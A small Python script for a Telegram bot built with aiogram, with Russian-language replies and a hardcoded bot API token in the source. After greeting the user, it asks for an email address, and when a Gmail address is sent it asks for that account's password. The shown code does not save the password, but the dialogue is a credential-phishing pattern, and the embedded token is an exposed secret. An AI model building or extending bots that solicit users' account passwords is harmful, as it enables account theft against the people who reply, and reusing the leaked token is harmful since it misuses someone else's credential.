from aiogram import Bot, Dispatcher, types, executor

bot = Bot("6396756239:AAGmpAtTeBnuTGBbjoU4S4XAUwbk1ne0Gro")
dp = Dispatcher(bot)

@dp.message_handler(commands='start')
async def start(message:types.Message):
    await message.answer("Привет! Как дела?")

@dp.message_handler(text='Привет')
async def hello(message:types.Message):
    await message.answer('Привет')

@dp.message_handler()
async def get_email(message:types.Message):
    if 'gmail.com' in message.text:
        await message.answer("А теперь введите пароль от аккаунта")
    else:
        await message.answer("Отправьте свою почту")

executor.start_polling(dp)